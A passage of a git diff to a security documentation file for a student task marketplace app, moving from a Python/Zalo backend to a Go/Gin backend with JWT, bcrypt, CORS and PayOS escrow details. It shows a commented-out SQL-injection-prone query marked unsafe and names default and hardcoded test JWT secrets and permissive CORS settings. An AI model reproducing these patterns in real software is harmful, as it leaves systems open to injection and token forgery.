@@ -1,7 +1,7 @@
 # Security Documentation
 
-**Project:** Dịch Vụ Nhỏ Cho Sinh Viên (Mini Services for Students)
-**Last Updated:** 2026-02-04
+**Project:** Viecz (Mini Services for Students)
+**Last Updated:** 2026-02-14
 **Status:** Development
 
 ---
@@ -11,14 +11,13 @@
 1. [Overview](#1-overview)
 2. [Authentication](#2-authentication)
 3. [Authorization](#3-authorization)
-4. [Data Protection](#4-data-protection)
+4. [Password Hashing](#4-password-hashing)
 5. [Input Validation](#5-input-validation)
-6. [Security Headers & CORS](#6-security-headers--cors)
+6. [CORS Configuration](#6-cors-configuration)
 7. [Payment Security](#7-payment-security)
 8. [WebSocket Security](#8-websocket-security)
-9. [Known Vulnerabilities](#9-known-vulnerabilities)
-10. [Threat Modeling](#10-threat-modeling)
-11. [Security Checklist](#11-security-checklist)
+9. [Token Storage (Android)](#9-token-storage-android)
+10. [Known Limitations](#10-known-limitations)
 
 ---
 
@@ -27,1621 +26,568 @@
 ### 1.1 Security Architecture
 
 ```
-┌─────────────────────────────────────────────────────────────────┐
-│                    SECURITY LAYER ARCHITECTURE                   │
-└─────────────────────────────────────────────────────────────────┘
-
-                    ┌─────────────────┐
-                    │  Zalo Mini App  │
-                    │    (Frontend)   │
-                    └────────┬────────┘
-                             │
-                    ┌────────▼────────┐
-                    │  CORS Validation │
-                    └────────┬────────┘
-                             │
-┌───────────────────────────────────────────────────────────────┐
-│                    FastAPI Backend                             │
-│                                                                 │
-│  ┌─────────────────────────────────────────────────────────┐  │
-│  │  1. Authentication Layer (JWT + Zalo OAuth)            │  │
-│  │     - Token verification                                │  │
-│  │     - User session management                           │  │
-│  └─────────────────────────────────────────────────────────┘  │
-│                             │                                   │
-│  ┌─────────────────────────▼───────────────────────────────┐  │
-│  │  2. Authorization Layer (Role-based)                    │  │
-│  │     - Requester vs Tasker permissions                   │  │
-│  │     - Resource ownership checks                         │  │
-│  └─────────────────────────────────────────────────────────┘  │
-│                             │                                   │
-│  ┌─────────────────────────▼───────────────────────────────┐  │
-│  │  3. Input Validation (Pydantic)                         │  │
-│  │     - Schema validation                                 │  │
-│  │     - Field constraints                                 │  │
-│  └─────────────────────────────────────────────────────────┘  │
-│                             │                                   │
-│  ┌─────────────────────────▼───────────────────────────────┐  │
-│  │  4. Business Logic Layer                                │  │
-│  │     - Payment escrow                                    │  │
-│  │     - Transaction atomicity                             │  │
-│  └─────────────────────────────────────────────────────────┘  │
-│                             │                                   │
-│  ┌─────────────────────────▼───────────────────────────────┐  │
-│  │  5. Data Access Layer (SQLAlchemy ORM)                  │  │
-│  │     - SQL injection prevention                          │  │
-│  │     - Prepared statements                               │  │
-│  └─────────────────────────────────────────────────────────┘  │
-└───────────────────────────────────────────────────────────────┘
-                             │
-                    ┌────────▼────────┐
-                    │  SQLite Database │
-                    └─────────────────┘
+                    +---------------------+
+                    |  Android App        |
+                    |  (Jetpack Compose)  |
+                    +---------+-----------+
+                              |
+                              | HTTPS / Bearer JWT
+                              |
++-----------------------------v-----------------------------------+
+|                    Go Backend (Gin)                              |
+|                                                                  |
+|  +----------------------------------------------------------+   |
+|  |  1. CORS Middleware                                       |   |
+|  |     - Origin validation                                   |   |
+|  |     - Preflight handling                                  |   |
+|  +----------------------------------------------------------+   |
+|                              |                                   |
+|  +----------------------------------------------------------+   |
+|  |  2. Auth Middleware (JWT HS256)                            |   |
+|  |     - Bearer token extraction                             |   |
+|  |     - Token validation + signing method check             |   |
+|  |     - User context injection                              |   |
+|  +----------------------------------------------------------+   |
+|                              |                                   |
+|  +----------------------------------------------------------+   |
+|  |  3. Gin Binding Validation                                |   |
+|  |     - Struct tag validation (required, email, min)        |   |
+|  |     - JSON schema enforcement                             |   |
+|  +----------------------------------------------------------+   |
+|                              |                                   |
+|  +----------------------------------------------------------+   |
+|  |  4. Business Logic Layer                                  |   |
+|  |     - Resource ownership checks                           |   |
+|  |     - Escrow payment logic                                |   |
+|  |     - Conversation participant verification               |   |
+|  +----------------------------------------------------------+   |
+|                              |                                   |
+|  +----------------------------------------------------------+   |
+|  |  5. Data Access Layer (GORM)                              |   |
+|  |     - Parameterized queries                               |   |
+|  |     - Model validation hooks (BeforeCreate/BeforeUpdate)  |   |
+|  +----------------------------------------------------------+   |
++------------------------------------------------------------------+
+                              |
+                    +---------v-----------+
+                    |  PostgreSQL (prod)  |
+                    |  SQLite (test)      |
+                    +---------------------+
 ```
 
-### 1.2 Security Principles
+### 1.2 Technology Stack
 
-- **Defense in Depth:** Multiple security layers
-- **Least Privilege:** Users only access what they need
-- **Fail Secure:** Deny by default, explicit allow
-- **Audit Everything:** Log all security-relevant events
-- **Secure by Default:** Safe configuration out-of-the-box
+| Layer | Technology |
+|-------|-----------|
+| Backend framework | Go + Gin |
+| Authentication | Email/password + JWT (golang-jwt/jwt v5) |
+| Password hashing | bcrypt (golang.org/x/crypto/bcrypt) |
+| ORM | GORM (PostgreSQL prod, SQLite test) |
+| Payment gateway | PayOS (payos-lib-golang v2) |
+| WebSocket | Gorilla WebSocket |
+| Android HTTP | OkHttp + Retrofit |
+| Android token storage | EncryptedSharedPreferences (AES-256) |
 
 ---
 
 ## 2. Authentication
 
-### 2.1 JWT Implementation
+### 2.1 Auth Flow
 
-**Location:** `backend/app/core/security.py`
+The project uses custom email/password authentication. No third-party OAuth (no Zalo, no Google).
+
+**Endpoints:**
+- `POST /api/v1/auth/register` -- Create account
+- `POST /api/v1/auth/login` -- Get access + refresh tokens
+- `POST /api/v1/auth/refresh` -- Exchange refresh token for new access token
+
+**Source:** `server/internal/handlers/auth.go`, `server/internal/auth/auth.go`
+
+### 2.2 JWT Implementation
+
+**Library:** `github.com/golang-jwt/jwt/v5`
 
 #### Token Types
 
-| Token Type | Expiry | Use Case | Algorithm |
-|------------|--------|----------|-----------|
-| **Access Token** | 15 minutes | API authentication | HS256 |
-| **Refresh Token** | 7 days | Token renewal | HS256 |
+| Token Type | Lifetime | Claims | Use Case |
+|------------|----------|--------|----------|
+| Access Token | 30 minutes | `sub` (user ID), `email`, `name`, `is_tasker`, `exp`, `iat`, `nbf` | API authentication |
+| Refresh Token | 7 days | `sub` (user ID), `email`, `exp`, `iat`, `nbf` | Token renewal |
 
-#### Token Structure
+Both tokens use **HS256** (HMAC-SHA256) signing.
 
-```python
-# Access Token Payload
-{
-    "sub": "123",           # User ID
-    "zalo_id": "abc123",    # Zalo OAuth ID
-    "name": "John Doe",     # User name
-    "is_tasker": true,      # Role flag
-    "exp": 1234567890,      # Expiration timestamp
-    "iat": 1234567890,      # Issued at timestamp
-    "type": "access"        # Token type
+#### Access Token Claims
+
+```go
+type Claims struct {
+    UserID   int64  `json:"sub"`
+    Email    string `json:"email"`
+    Name     string `json:"name"`
+    IsTasker bool   `json:"is_tasker"`
+    jwt.RegisteredClaims // exp, iat, nbf
 }
 ```
 
+**Source:** `server/internal/auth/jwt.go`
+
 #### Token Generation
 
-```python
-# backend/app/core/security.py:12-42
+```go
+// Access token: 30 minutes
+auth.GenerateAccessToken(user, jwtSecret, 30)
 
-def create_access_token(data: Dict[str, Any], expires_delta: Optional[timedelta] = None) -> str:
-    """
-    Create a JWT access token.
-    - Uses HS256 algorithm
-    - Default expiry: 15 minutes
-    - Includes: sub, zalo_id, name, is_tasker, exp, iat, type
-    """
-    to_encode = data.copy()
+// Refresh token: 7 days
+auth.GenerateRefreshToken(user, jwtSecret, 7)
+```
 
-    if expires_delta:
-        expire = datetime.utcnow() + expires_delta
-    else:
-        expire = datetime.utcnow() + timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES)
+Both `Register` and `Login` handlers return the same `TokenResponse`:
 
-    to_encode.update({
-        "exp": expire,
-        "iat": datetime.utcnow(),
-        "type": "access"
+```json
+{
+  "access_token": "<jwt>",
+  "refresh_token": "<jwt>",
+  "user": { ... }
+}
+```
+
+#### Token Validation
+
+```go
+func ValidateToken(tokenString string, secret string) (*Claims, error) {
+    token, err := jwt.ParseWithClaims(tokenString, &Claims{}, func(token *jwt.Token) (interface{}, error) {
+        // Verify signing method is HMAC (prevents algorithm confusion attacks)
+        if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
+            return nil, fmt.Errorf("unexpected signing method: %v", token.Header["alg"])
+        }
+        return []byte(secret), nil
     })
-
-    encoded_jwt = jwt.encode(
-        to_encode,
-        settings.JWT_SECRET,
-        algorithm=settings.JWT_ALGORITHM
-    )
-
-    return encoded_jwt
+    // ...
+}
 ```
 
-#### Token Verification
+The validation checks:
+1. Signing method is HMAC (rejects RSA/none algorithm attacks)
+2. Signature validity
+3. Token expiration (`exp` claim)
+4. Not-before time (`nbf` claim)
 
-```python
-# backend/app/core/security.py:74-99
+**Source:** `server/internal/auth/jwt.go:64-84`
 
-def verify_token(token: str, token_type: str = "access") -> Optional[Dict[str, Any]]:
-    """
-    Verify and decode a JWT token.
+#### Token Refresh
 
-    Security checks:
-    1. Signature verification (HMAC-SHA256)
-    2. Expiration validation
-    3. Token type validation
-    """
-    try:
-        payload = jwt.decode(
-            token,
-            settings.JWT_SECRET,
-            algorithms=[settings.JWT_ALGORITHM]
-        )
+`POST /api/v1/auth/refresh` accepts a `refresh_token`, validates it, and returns a new access token. The refresh token itself is not rotated.
 
-        # Verify token type
-        if payload.get("type") != token_type:
-            return None
+**Note:** The refresh handler reconstructs a `User` from the refresh token claims rather than fetching from the database. This means stale user data (e.g., changed `is_tasker` flag) persists in new access tokens until the user performs a full login.
 
-        return payload
+**Source:** `server/internal/handlers/auth.go:132-170`
 
-    except JWTError:
-        return None
-```
+### 2.3 JWT Secret Configuration
 
-### 2.2 Zalo OAuth Flow
+| Environment | Secret | Source |
+|-------------|--------|--------|
+| Development | `your-secret-key-change-in-production` | Default in `config.go` |
+| Test server | `e2e-test-secret-key` | Hardcoded in `cmd/testserver/main.go` |
+| Production | Must be set via `JWT_SECRET` env var | Enforced: config fails if default is used with `GO_ENV=production` |
 
-**Location:** `backend/app/routers/auth.py`
-
-#### OAuth Security Features
-
-1. **appsecret_proof:** HMAC-SHA256 signature required since 2024
-2. **miniapp_id:** Verifies token from correct Mini App
-3. **Token Verification:** Server-side validation with Zalo API
-
-#### OAuth Implementation
-
-```python
-# backend/app/routers/auth.py:42-75
-
-# Generate appsecret_proof (HMAC-SHA256 of access_token with app_secret)
-# Required since January 1, 2024 for Zalo Graph API
-appsecret_proof = hmac.new(
-    settings.ZALO_APP_SECRET.encode('utf-8'),
-    request.access_token.encode('utf-8'),
-    hashlib.sha256
-).hexdigest()
-
-# Get user info from Zalo API
-async with httpx.AsyncClient() as client:
-    response = await client.get(
-        "https://graph.zalo.me/v2.0/me",
-        params={
-            "fields": "id,name,picture",
-            "miniapp_id": settings.ZALO_MINIAPP_ID,
-        },
-        headers={
-            "access_token": request.access_token,
-            "appsecret_proof": appsecret_proof,
-        },
-        timeout=10.0
-    )
-```
-
-**Security Measures:**
-
-- Server-side token validation (not client-side only)
-- HMAC signature prevents token tampering
-- Timeout protection (10 seconds)
-- Error handling for network failures
-- Logging of authentication attempts
-
-### 2.3 Token Storage
-
-**Frontend:** `localStorage` (Zalo Mini App context)
-
-```typescript
-// Token storage pattern
-const token = response.access_token;
-localStorage.setItem('access_token', token);
-localStorage.setItem('refresh_token', response.refresh_token);
-
-// Token usage
-const headers = {
-    'Authorization': `Bearer ${localStorage.getItem('access_token')}`
-};
-```
-
-**Security Considerations:**
-
-⚠️ **Risks:**
-- XSS attacks can steal tokens from localStorage
-- No HttpOnly protection in Mini App context
-
-✅ **Mitigations:**
-- Short access token expiry (15 minutes)
-- Content Security Policy headers
-- Input sanitization prevents XSS
-- Secure token refresh mechanism
-
-### 2.4 Dev Login (DEBUG Mode Only)
-
-**Location:** `backend/app/routers/auth.py:196-256`
-
-```python
-@router.post("/dev-login", response_model=TokenResponse)
-async def dev_login(
-    name: str = "Test User",
-    db: Session = Depends(get_db)
-):
-    """
-    Development login - creates a test user without Zalo.
-    Only available when DEBUG=true.
-    """
-    if not settings.DEBUG:
-        raise HTTPException(
-            status_code=status.HTTP_404_NOT_FOUND,
-            detail="Not found"
-        )
-```
-
-**Security Features:**
-
-- Only enabled when `DEBUG=true`
-- Returns 404 in production (endpoint hidden)
-- Generates random test Zalo IDs
-- Creates wallets with mock balance
-- Logs all dev logins
+**Source:** `server/internal/config/config.go:60, 79-81`
 
 ---
 
 ## 3. Authorization
 
-### 3.1 Role-Based Access Control (RBAC)
+### 3.1 Auth Middleware
 
-**Roles:**
+**`AuthRequired`** -- Gin middleware that enforces JWT authentication.
 
-| Role | Description | Permissions |
-|------|-------------|-------------|
-| **Requester** | Posts tasks | Create tasks, Accept applications, Release payments |
-| **Tasker** | Performs tasks | Apply to tasks, Mark complete, Receive payments |
-| **Both** | Can switch roles | All permissions based on context |
-
-**Implementation:** User model has `is_tasker` boolean flag
-
-### 3.2 Authentication Dependencies
-
-**Location:** `backend/app/core/dependencies.py`
-
-#### get_current_user
-
-```python
-# backend/app/core/dependencies.py:17-63
-
-async def get_current_user(
-    credentials: HTTPAuthorizationCredentials = Depends(security),
-    db: Session = Depends(get_db)
-) -> User:
-    """
-    Get the current authenticated user.
-
-    Security checks:
-    1. Verify Bearer token format
-    2. Decode and validate JWT
-    3. Check token type (access)
-    4. Verify user exists in database
-    """
-    token = credentials.credentials
-
-    # Verify token
-    payload = verify_token(token, token_type="access")
-    if payload is None:
-        raise HTTPException(
-            status_code=status.HTTP_401_UNAUTHORIZED,
-            detail="Invalid or expired token",
-            headers={"WWW-Authenticate": "Bearer"},
-        )
-
-    # Get user ID from payload
-    user_id = payload.get("sub")
-    if user_id is None:
-        raise HTTPException(
-            status_code=status.HTTP_401_UNAUTHORIZED,
-            detail="Invalid token payload",
-            headers={"WWW-Authenticate": "Bearer"},
-        )
-
-    # Get user from database
-    user = db.query(User).filter(User.id == int(user_id)).first()
-    if user is None:
-        raise HTTPException(
-            status_code=status.HTTP_401_UNAUTHORIZED,
-            detail="User not found",
-            headers={"WWW-Authenticate": "Bearer"},
-        )
-
-    return user
+```go
+func AuthRequired(jwtSecret string) gin.HandlerFunc
 ```
 
-#### get_current_tasker
+Steps:
+1. Extract `Authorization: Bearer <token>` header
+2. Validate JWT token
+3. Inject `user_id`, `email`, `name`, `is_tasker` into Gin context
+4. Abort with 401 on failure
 
-```python
-# backend/app/core/dependencies.py:83-97
+**`OptionalAuth`** -- Same extraction logic but does not abort if token is missing. Used for endpoints that behave differently for authenticated vs anonymous users.
 
-async def get_current_tasker(
-    current_user: User = Depends(get_current_user)
-) -> User:
-    """
-    Get the current user and verify they are a registered Tasker.
+**Source:** `server/internal/auth/middleware.go`
 
-    Security check:
-    - Ensures user has is_tasker=True
-    """
-    if not current_user.is_tasker:
-        raise HTTPException(
-            status_code=status.HTTP_403_FORBIDDEN,
-            detail="You must be a registered Tasker to perform this action"
-        )
-    return current_user
-```
+### 3.2 Protected Routes
 
-### 3.3 Endpoint-Level Authorization
+The following route groups require `AuthRequired`:
 
-**Pattern:** Dependency injection for access control
+| Route Group | Middleware |
+|-------------|-----------|
+| `GET/PUT /api/v1/users/me`, `POST /api/v1/users/become-tasker` | AuthRequired |
+| `/api/v1/tasks/*` | AuthRequired |
+| `/api/v1/applications/*` | AuthRequired |
+| `/api/v1/wallet/*` | AuthRequired |
+| `/api/v1/payments/*` | AuthRequired |
+| `/api/v1/conversations/*` | AuthRequired |
 
-```python
-# Example: Task application endpoint
-@router.post("/tasks/{task_id}/apply")
-async def apply_to_task(
-    task_id: int,
-    request: TaskApplicationCreate,
-    db: Session = Depends(get_db),
-    current_user: User = Depends(get_current_tasker)  # Requires Tasker role
-):
-    # Only Taskers can apply
-    pass
-```
+Public routes (no auth): `/api/v1/auth/*`, `/api/v1/health`, `/api/v1/categories`, `GET /api/v1/users/:id`, `/api/v1/payment/webhook`.
 
-### 3.4 Resource Ownership Checks
+**Source:** `server/cmd/server/main.go:132-224`
 
-**Pattern:** Verify user owns resource before modification
+### 3.3 Resource Ownership
 
-```python
-# Example: Task update
-task = db.query(Task).filter(Task.id == task_id).first()
+Authorization checks are enforced at the service/handler level:
 
-# Check ownership
-if task.requester_id != current_user.id:
-    raise HTTPException(
-        status_code=status.HTTP_403_FORBIDDEN,
-        detail="You can only edit your own tasks"
-    )
-```
-
-**Applied to:**
-
-- Task CRUD operations
-- Payment release
-- Application acceptance
-- Message access
-- Wallet operations
+- **Tasks:** Only the requester can update/delete their own tasks
+- **Escrow payment:** Only the task requester can create escrow (`task.RequesterID != payerID`)
+- **Release payment:** Only the requester can release (`task.RequesterID != requesterID`)
+- **Refund payment:** Only the requester can refund
+- **Conversations:** Only poster or tasker can send/read messages (`conversation.PosterID != client.UserID && conversation.TaskerID != client.UserID`)
 
 ---
 
-## 4. Data Protection
+## 4. Password Hashing
 
-### 4.1 Token Encryption
+### 4.1 Registration
 
-**Algorithm:** HS256 (HMAC-SHA256)
+Passwords are hashed using **bcrypt** with `bcrypt.DefaultCost` (currently 10 rounds).
 
-```python
-# backend/app/config.py:48-49
-JWT_SECRET: str = "change-this-secret-key-in-production"
-JWT_ALGORITHM: str = "HS256"
+```go
+hashedPassword, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
 ```
 
-**Security Properties:**
+**Source:** `server/internal/auth/auth.go:53-57`
 
-- **Symmetric encryption:** Same key for sign/verify
-- **256-bit security:** SHA256 hash
-- **MAC protection:** Prevents tampering
-- **No encryption:** Payload is base64-encoded (not encrypted)
+### 4.2 Login
 
-⚠️ **Warning:** Do not store sensitive data in JWT payload (it's readable)
+Password comparison uses constant-time bcrypt verification:
 
-### 4.2 Password Handling
-
-**Current Implementation:** None (Zalo OAuth only)
-
-- No password storage
-- No password hashing required
-- All authentication via Zalo
-
-**Future Considerations:** If adding email/password:
-
-```python
-# Recommended: bcrypt or Argon2
-from passlib.context import CryptContext
-
-pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
-
-def hash_password(password: str) -> str:
-    return pwd_context.hash(password)
-
-def verify_password(plain_password: str, hashed_password: str) -> bool:
-    return pwd_context.verify(plain_password, hashed_password)
+```go
+bcrypt.CompareHashAndPassword([]byte(user.PasswordHash), []byte(password))
 ```
 
-### 4.3 Sensitive Data Exposure
+Login returns a generic "invalid email or password" error for both non-existent emails and wrong passwords, preventing user enumeration.
 
-**Protected Fields:**
+**Source:** `server/internal/auth/auth.go:78-92`
 
-| Field | Protection | Notes |
-|-------|------------|-------|
-| `JWT_SECRET` | Environment variable | Never commit to git |
-| `ZALO_APP_SECRET` | Environment variable | Used for appsecret_proof |
-| `ZALOPAY_KEY1/KEY2` | Environment variable | Payment credentials |
-| Zalo access tokens | Logged partially | Only first/last 10 chars |
+### 4.3 Password Strength Validation
 
-**Logging Security:**
+Enforced at registration time via `IsStrongPassword()`:
 
-```python
-# backend/app/routers/auth.py:37-40
-token = request.access_token
-token_preview = f"{token[:10]}...{token[-10:]}" if len(token) > 20 else token
-logger.info(f"Received access_token: {token_preview} (length: {len(token)})")
-```
+- Minimum 8 characters
+- At least one uppercase letter (A-Z)
+- At least one lowercase letter (a-z)
+- At least one digit (0-9)
 
-### 4.4 JWT Secret Management
+**Source:** `server/internal/models/user.go:94-117`
 
-**Current (Development):**
+### 4.4 User Model Security
 
-```bash
-# .env
-JWT_SECRET=change-this-secret-key-in-production
-```
+- `PasswordHash` field has `json:"-"` tag, ensuring it is never serialized in API responses
+- `BeforeCreate` and `BeforeUpdate` GORM hooks run validation before any database write
+- Email format is validated via regex: `^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$`
+- Email has a `unique` database constraint
 
-**Production Requirements:**
-
-```bash
-# Generate secure secret
-python -c "import secrets; print(secrets.token_urlsafe(64))"
-
-# .env.production
-JWT_SECRET=<generated-secret-minimum-32-characters>
-```
-
-**Best Practices:**
-
-- Minimum 32 characters
-- Random generation
-- Never reuse across environments
-- Rotate periodically (requires re-login)
-- Store in secure vault (not .env in production)
+**Source:** `server/internal/models/user.go`
 
 ---
 
 ## 5. Input Validation
 
-### 5.1 Pydantic Schema Validation
+### 5.1 Gin Binding Validation
 
-**All API inputs validated via Pydantic models**
+All request payloads are validated using Gin's struct binding tags:
 
-#### Task Creation Validation
+| Endpoint | Field | Validation |
+|----------|-------|------------|
+| `POST /auth/register` | `email` | `required,email` |
+| `POST /auth/register` | `password` | `required,min=8` |
+| `POST /auth/register` | `name` | `required` |
+| `POST /auth/login` | `email` | `required,email` |
+| `POST /auth/login` | `password` | `required` |
+| `POST /auth/refresh` | `refresh_token` | `required` |
+| `POST /wallet/deposit` | `amount` | `required,min=2000` |
+| `POST /payments/escrow` | `task_id` | `required` |
+| `POST /payments/release` | `task_id` | `required` |
+| `POST /payments/refund` | `task_id` | `required` |
+| `POST /payments/refund` | `reason` | `required` |
+| `POST /conversations` | `task_id` | `required` |
+| `POST /conversations` | `tasker_id` | `required` |
 
-```python
-# backend/app/schemas/task.py:12-21
+**Source:** `server/internal/handlers/auth.go`, `server/internal/handlers/wallet.go`, `server/internal/handlers/payment.go`, `server/internal/handlers/websocket.go`
 
-class TaskBase(BaseModel):
-    """Base task schema."""
-    title: str = Field(..., min_length=5, max_length=200)
-    description: Optional[str] = Field(None, max_length=2000)
-    price: int = Field(..., gt=0, le=10000000)  # Max 10M VND
-    price_negotiable: bool = False
-    category_id: int
-    location_from: Optional[str] = Field(None, max_length=200)
-    location_to: Optional[str] = Field(None, max_length=200)
-    deadline: Optional[datetime] = None
-```
+### 5.2 Model-Level Validation
 
-**Validation Rules:**
+The `User` model enforces constraints via `Validate()`:
+- Email required, regex-validated
+- Name required, max 100 characters
+- Password hash required
+- Rating between 0 and 5
+- Non-negative counters (tasks completed, tasks posted, earnings)
+- Tasker bio max 500 characters
+- Tasker skills max 10 items
 
-- `title`: 5-200 characters (prevents empty or excessively long titles)
-- `description`: Max 2000 characters (prevents DoS via large payloads)
-- `price`: 1-10,000,000 VND (realistic range, prevents negative/zero prices)
-- `location_from/to`: Max 200 characters
-- Type validation: Pydantic ensures correct types
+**Source:** `server/internal/models/user.go:37-85`
 
-#### Authentication Validation
+### 5.3 SQL Injection Prevention
 
-```python
-# backend/app/schemas/auth.py:9-11
-
-class ZaloAuthRequest(BaseModel):
-    """Zalo OAuth login request."""
-    access_token: str = Field(..., description="Zalo access token from Mini App SDK")
-```
-
-- Required field (cannot be None)
-- Must be string type
-
-### 5.2 SQL Injection Prevention
-
-**Protection:** SQLAlchemy ORM with parameterized queries
-
-```python
-# ✅ SAFE: ORM query (parameterized)
-user = db.query(User).filter(User.id == user_id).first()
-
-# ✅ SAFE: ORM with parameters
-tasks = db.query(Task).filter(
-    Task.requester_id == current_user.id,
-    Task.status == TaskStatus.OPEN.value
-).all()
-
-# ❌ UNSAFE: Raw SQL (NEVER DO THIS)
-# db.execute(f"SELECT * FROM users WHERE id = {user_id}")
-```
-
-**SQLAlchemy Security Features:**
-
-- Prepared statements
-- Parameter binding
-- Type casting
-- Escaping handled automatically
-
-### 5.3 XSS Prevention
-
-**Backend Protection:**
-
-1. **No HTML rendering:** API returns JSON only
-2. **Content-Type:** `application/json`
-3. **Schema validation:** Pydantic prevents injection
-
-**Frontend Responsibility:**
-
-- React escapes by default
-- Use `textContent` not `innerHTML`
-- Sanitize user-generated content
-
-### 5.4 Field Constraints Summary
-
-| Field | Min | Max | Type | Notes |
-|-------|-----|-----|------|-------|
-| Task title | 5 | 200 | str | Required |
-| Task description | 0 | 2000 | str | Optional |
-| Task price | 1 | 10000000 | int | VND |
-| Location | 0 | 200 | str | Optional |
-| Message content | 1 | - | str | Required |
-| Application message | 0 | 500 | str | Optional |
+GORM uses parameterized queries for all database operations. No raw SQL strings with user input.
 
 ---
 
-## 6. Security Headers & CORS
+## 6. CORS Configuration
 
-### 6.1 CORS Configuration
+### 6.1 Implementation
 
-**Location:** `backend/app/main.py:76-82`
+CORS is handled by a custom Gin middleware.
 
-```python
-app.add_middleware(
-    CORSMiddleware,
-    allow_origins=settings.CORS_ORIGINS,
-    allow_credentials=True,
-    allow_methods=["*"],
-    allow_headers=["*"],
-)
+**Source:** `server/internal/middleware/cors.go`
+
+#### Production Server
+
+Accepts a single `allowedOrigin` from config (`CLIENT_URL`). Also permits `null` origin for WebView/file protocol contexts.
+
+```go
+// Headers set on every response:
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Headers: Content-Type, Content-Length, Accept-Encoding, X-CSRF-Token, Authorization, accept, origin, Cache-Control, X-Requested-With
+Access-Control-Allow-Methods: POST, OPTIONS, GET, PUT, DELETE
 ```
 
-### 6.2 Allowed Origins
+OPTIONS preflight requests return 204 immediately.
 
-**Location:** `backend/app/config.py:20-31`
+#### Test Server
 
-```python
-CORS_ORIGINS: List[str] = [
-    "http://localhost:3000",
-    "http://localhost:2999",
-    "http://127.0.0.1:3000",
-    "http://127.0.0.1:2999",
-    # Zalo Mini App origins
-    "https://h5.zalo.me",
-    "https://stc-h5.zalo.me",
-    "https://stc-sandbox.zalo.me",
-    "https://h5.zdn.vn",
-    "https://stc-h5.zdn.vn",
-]
-```
+Uses `"*"` as allowed origin for development convenience.
 
-**Security Considerations:**
-
-✅ **Secure:**
-- Whitelist only known origins
-- No wildcard in production
-- Includes Zalo Mini App domains
-
-⚠️ **Risks:**
-- `allow_credentials=True` with multiple origins
-- `allow_methods=["*"]` permits all HTTP methods
-
-**Production Recommendations:**
-
-```python
-# production.py
-CORS_ORIGINS = [
-    "https://viecz.zalopay.vn",  # Production Mini App URL
-    "https://h5.zalo.me",
-]
-
-app.add_middleware(
-    CORSMiddleware,
-    allow_origins=settings.CORS_ORIGINS,
-    allow_credentials=True,
-    allow_methods=["GET", "POST", "PUT", "DELETE"],  # Explicit methods
-    allow_headers=["Content-Type", "Authorization"],  # Explicit headers
-    max_age=3600,
-)
-```
-
-### 6.3 Origin Logging Middleware
-
-**Location:** `backend/app/main.py:67-74`
-
-```python
-class OriginLoggerMiddleware(BaseHTTPMiddleware):
-    async def dispatch(self, request: Request, call_next):
-        origin = request.headers.get("origin", "no-origin")
-        logger.info(f"Request from origin: {origin}, method: {request.method}, path: {request.url.path}")
-        response = await call_next(request)
-        return response
-```
-
-**Purpose:** Debug CORS issues, audit request sources
-
-### 6.4 Security Headers (Missing)
-
-⚠️ **Currently Not Implemented:**
-
-```python
-# TODO: Add security headers middleware
-from starlette.middleware.base import BaseHTTPMiddleware
-
-class SecurityHeadersMiddleware(BaseHTTPMiddleware):
-    async def dispatch(self, request, call_next):
-        response = await call_next(request)
-        response.headers["X-Content-Type-Options"] = "nosniff"
-        response.headers["X-Frame-Options"] = "DENY"
-        response.headers["X-XSS-Protection"] = "1; mode=block"
-        response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
-        response.headers["Content-Security-Policy"] = "default-src 'self'"
-        return response
-```
+**Source:** `server/cmd/server/main.go:124`, `server/cmd/testserver/main.go:164`
 
 ---
 
 ## 7. Payment Security
 
-### 7.1 Escrow Model
+### 7.1 PayOS Integration
 
-**Flow:** Requester → Escrow → Tasker (minus 10% fee)
+The project uses [PayOS](https://payos.vn/) for payment processing.
 
-```
-Phase 1: Payment Hold (Escrow)
-┌──────────────┐        ┌──────────────┐        ┌──────────────┐
-│  Requester   │        │    Escrow    │        │    Tasker    │
-│   Wallet     │───────>│    Wallet    │        │              │
-└──────────────┘        └──────────────┘        └──────────────┘
-   -100,000đ              +100,000đ
+**SDK:** `github.com/payOSHQ/payos-lib-golang/v2`
 
-Phase 2: Payment Release (Task Completed)
-┌──────────────┐        ┌──────────────┐        ┌──────────────┐
-│  Requester   │        │    Escrow    │        │    Tasker    │
-│              │        │    Wallet    │───────>│   Wallet     │
-└──────────────┘        └──────────────┘        └──────────────┘
-                          -100,000đ              +90,000đ
+**Configuration (env vars):**
+- `PAYOS_CLIENT_ID`
+- `PAYOS_API_KEY`
+- `PAYOS_CHECKSUM_KEY`
 
-                        ┌──────────────┐
-                        │   Platform   │
-                        │   Wallet     │
-                        └──────────────┘
-                          +10,000đ
-```
+**Source:** `server/internal/services/payos.go`, `server/internal/config/config.go`
 
-### 7.2 Transaction Atomicity
+### 7.2 Webhook Signature Verification
 
-**Location:** `backend/app/services/mock_payment.py:126-209`
+PayOS webhooks are verified using the SDK's `Webhooks.VerifyData()` method, which validates the HMAC signature using the checksum key.
 
-```python
-def create_escrow_payment(self, task: Task, payer: User) -> dict:
-    """
-    Create escrow payment for a task.
+```go
+func (h *WebhookHandler) HandleWebhook(c *gin.Context) {
+    var webhookData map[string]interface{}
+    c.ShouldBindJSON(&webhookData)
 
-    Atomic operations:
-    1. Check balance
-    2. Deduct from payer wallet
-    3. Add to escrow wallet
-    4. Create transaction record
-    5. Update task status
-    6. Commit all or rollback
-    """
-    try:
-        # Get wallets
-        payer_wallet = self.get_or_create_user_wallet(payer.id)
-        escrow_wallet = self.get_or_create_escrow_wallet()
-
-        amount = task.price
-
-        # Check balance
-        if payer_wallet.available_balance < amount:
-            return {"success": False, "error": "Số dư không đủ"}
-
-        # Atomic transaction
-        payer_wallet.balance -= amount
-        escrow_wallet.balance += amount
-
-        # Record transactions
-        self._record_transaction(...)
-
-        # Update task
-        task.status = TaskStatus.IN_PROGRESS.value
-
-        self.db.commit()
-
-        return {"success": True}
-
-    except Exception as e:
-        self.db.rollback()
-        logger.error(f"Escrow payment error: {e}")
-        return {"success": False, "error": str(e)}
-```
-
-**Security Features:**
-
-- Try-catch with rollback on error
-- Balance validation before deduction
-- Wallet transaction logging
-- Reference ID generation
-- Transaction status tracking
-
-### 7.3 Balance Validation
-
-**Location:** `backend/app/services/mock_payment.py:145-150`
-
-```python
-# Check balance
